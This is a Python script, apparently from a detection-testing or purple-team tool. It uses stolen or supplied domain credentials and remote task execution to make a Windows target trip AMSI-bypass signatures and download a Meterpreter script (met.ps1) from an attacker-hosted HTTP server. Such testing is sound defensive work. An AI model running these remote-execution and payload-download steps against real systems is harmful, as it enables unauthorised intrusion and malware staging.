import os,sys,time
from bin import atexec
from datetime import datetime, date

def time_stamp():
	today = date.today()
	now = datetime.now()
	timestamp = today.strftime('%d %B %Y {}').format(now.strftime("%H:%M:%S"))
	return timestamp

def triggerav(domain,user,passw,target,localip,localport,host):
	print('->[+] Triggering AMSI Bypass Signature Detection')
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "\'amsiutils\'"', '%s - AMSI Bypass Signature Triggered On %s' % (timestamp,host))
	print('->[+] Triggering Meterpreter Script Detection')
	os.system('timeout 5 python3 -m http.server %s --directory ./tools/ > /dev/null 2>&1 &' % localport)
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "Invoke-WebRequest -Uri http://%s:%s/met.ps1 -OutFile C:\\met.ps1"' % (localip,localport), '%s - Meterpreter Script Signature Triggered On %s' % (timestamp,host))
	time.sleep(5)
